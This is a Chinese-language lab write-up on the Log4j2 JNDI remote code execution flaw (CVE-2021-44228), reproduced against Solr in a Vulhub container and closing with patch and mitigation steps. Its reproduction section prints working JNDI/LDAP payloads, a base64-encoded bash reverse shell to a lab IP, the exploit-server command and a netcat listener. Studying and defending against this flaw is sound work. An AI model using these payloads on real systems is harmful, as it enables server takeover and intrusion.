
# 0X00 漏洞信息
Apache Log4j是Apache的一个开源项目 ，Apache log4j2是Log4j的升级版本，用户可以控制日志信息输送的目的地为控制台、文件、GUI 组件等，通过定义每一条日志信息的级别，能够更加细致地控制日志的生成过程。<br />Log4j-2中存在JNDI注入漏洞，当程序将用户输入的数据进行日志记录时，即可触发此漏洞，成功利用此漏洞可以在目标服务器上执行任意代码。该漏洞影响Apache Struts、Apache Solr、Apache Druid、Apache Filnk等众多组件，漏洞影响面大,危害性高，建议客户尽快自查在用软件系统是否受影响，采取措施防护此漏洞。


# 0X01 漏洞概述
| 漏洞名称 | Apache Log4j2远程代码执行漏洞 |
| --- | --- |
| 漏洞等级 | 高危 |
| CVE编号 | CVE-2021-44228 |
| 其他编号 | 暂无 |
| 披露时间 | 2021/12/09 |
| 分数 | 10.0 |
| CVSS | 3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H |
| 披露链接 | [https://nvd.nist.gov/vuln/detail/CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) |


# 0X02 影响范围

- 2.0-beta9 <= Apache Log4j <= 2.3
- 2.4 <= Apache Log4j <= 2.12.1
- 2.13.0<= Apache Log4j <= 2.15.0-rc1


# 0X03 环境搭建
**使用Vulhub搭建漏洞复现环境**<br />参考地址：[https://github.com/vulhub/vulhub/blob/master/log4j/CVE-2021-44228/README.zh-cn.md](https://github.com/vulhub/vulhub/blob/master/log4j/CVE-2021-44228/README.zh-cn.md)

1、将Vulhub下载到本地，并进入log4j2漏洞目录
```
cd /root/vulhub-master/log4j/CVE-2021-44228/
docker-compose up -d
```
![image.png](./assets/1669610143166-066556a0-f684-4fca-b529-07f16a5880a0.png)

2、在浏览器访问http://IP:8983
![image.png](./assets/1669610200047-7edbd500-a8cb-45bc-ada4-981c3053aa53.png)

3、环境搭建成功


# 0X04 漏洞原理
`org.apache.logging.log4j.core.pattern.MessagePatternConverter`类的`format()`方法发现日志中包含`${`就会将表达式的内容替换为表达式解析后的内容，而不是表达式本身，从而导致攻击者构造符合要求的表达式供系统执行。`${`可使用的关键词非常多，例如：`${java:os}`、`${hostName}`、`${jndi:logging/context-name}`等。<br />`org.apache.logging.log4j.core.lookup.StrSubstitutor`中提取参数并通过lookup进行内容替换，当日志在打印时遇到`${`后，`Interpolator`类以`：`号作为分割，将表达式内容分割成两部分，前面部分作为prefix，后面部分作为key。然后通过prefix去找对应的lookup，通过对应的lookup实例调用lookup方法，最后将key作为参数带入执行。

**JNDI注入：**<br />        目前网络上传播广泛的POC：`${jndi:ldap://my-ip/exp}`除了利用到log4j的递归解析，同样涉及到了JNDI注入，所谓的JNDI注入就是当上文代码中JNDI变量可控时引发的漏洞，它将导致远程class文件加载，从而导致远程代码执行。当这条语句被传入到log4j日志文件中，lookup会将JNDI注入可执行语句执行，程序会通过ldap协议访问my-ip这个地址，然后my-ip就会返回一个包含java代码的class文件的地址，然后程序再通过返回的地址下载class文件并执行，从而达成漏洞利用目的。

**漏洞大致利用流程：**

1. 向目标发送指定payload，目标对payload进行解析执行，然后会通过JNDI链接远程服务，当JNDI服务收到请求之后，将请求进行重定向到恶意 java class的地址。
2. 目标服务器收到重定向请求之后，下载恶意class并执行其中的代码，从而执行系统命令。


# 0X05 漏洞复现
`${jndi:dns://${sys:java.version}.example.com}`是利用JNDI发送DNS请求的Payload，我们将其作为管理员接口的action参数值发送如下数据包：
```
GET /solr/admin/cores?action=${jndi:ldap://${sys:java.version}.example.com} HTTP/1.1
Host: your-ip:8983
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
Connection: close
```

**验证漏洞是否存在**<br />1、首先在DNSlog平台拿到一个域名
![image.png](./assets/1669610975442-3bb2d103-2436-4b1c-a07e-e4f7042f3efa.png)

2、用到管理的接口的action参数构造payload，并访问
```
http://192.168.10.9:8983/solr/admin/cores?action=${jndi:ldap://${sys:java.version}.vqdjxb.dnslog.cn}
```
![image.png](./assets/1669611095733-011588aa-283b-4ea4-829c-bb4f0bc02ea2.png)

3、访问之后，dnslog平台出现数据，显示出当前java版本，证明漏洞存在
![image.png](./assets/1669611120105-abe411f4-4141-4312-a836-12c5e3fd1b9b.png)

**反弹shell**<br />1、构造反弹shell命令
```
bash -i >& /dev/tcp/192.168.10.38/6666 0>&1
```

2、进行编码
```
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwLjM4LzY2NjYgMD4mMQ==}|{base64,-d}|{bash,-i} 
```
[<br />](https://github.com/welk1n/JNDI-Injection-Exploit/blob/master/README-CN.md)
3、然后在kali上利用工具（[JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar](https://github.com/welk1n/JNDI-Injection-Exploit/blob/master/README-CN.md)）来启动ldap和web服务
```
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwLjM4LzY2NjYgMD4mMQ==}|{base64,-d}|{bash,-i} " -A "192.168.10.38"
```
![image.png](./assets/1669612258515-5a28ced7-1eb0-4370-befe-57f639280f29.png)

4、新开启一个kali窗口监听
```
nc -lvvnp 6666
```
![image.png](./assets/1669612305869-0ca2140f-4749-4fd5-8e3c-fb43dcf851f7.png)

5、访问
```
http://192.168.10.9:8983/solr/admin/cores?action=${jndi:ldap://192.168.10.38:1389/byxqhk}
```
成功反弹
![image.png](./assets/1669612530859-8a5acd2a-981e-433f-9610-f01726c2cf00.png)


# 0X06 解决方案
目前官方已发布测试版本修复该漏洞，受影响用户可先将Apache Log4j2所有相关应用到该版本。<br />下载链接：[https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2](https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2)

**临时缓解方案**<br />若受影响用户暂时无法进行升级操作，可以使用systemtap来临时缓解：

1. 添加jvm启动参数:`-Dlog4j2.formatMsgNoLookups=true `
2. 在应用classpath下添加[log4j2.component.properties](http://log4j2.component.properties/)配置文件，文件内容为：log4j2.formatMsgNoLookups=true

![image.png](./assets/1669613361258-0498ee19-ad81-4f6c-b496-b8f5ffd473a9.png)

3. 建议JDK使用11.0.1、8u191、7u201、6u211及以上的高版本
4. 限制受影响应用对外访问互联网，并在边界对dnslog相关域名访问进行检测。
